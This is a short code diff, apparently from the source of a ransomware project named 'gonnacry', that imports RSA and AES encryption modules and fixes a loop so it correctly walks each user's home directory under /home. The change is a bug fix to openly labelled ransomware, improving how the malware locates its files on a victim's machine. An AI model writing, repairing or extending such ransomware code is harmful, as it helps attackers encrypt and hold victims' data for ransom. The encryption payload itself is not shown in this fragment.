@@ -6,8 +6,8 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 
 ransomware_name = "gonnacry"
-for file in os.listdir("/home"):
-	home = os.path.join("/home")
+for user in os.listdir("/home"):
+	home = os.path.join("/home", user)
 	if os.path.isdir(os.path.join(home, ransomware_name)):
 		break
 else:
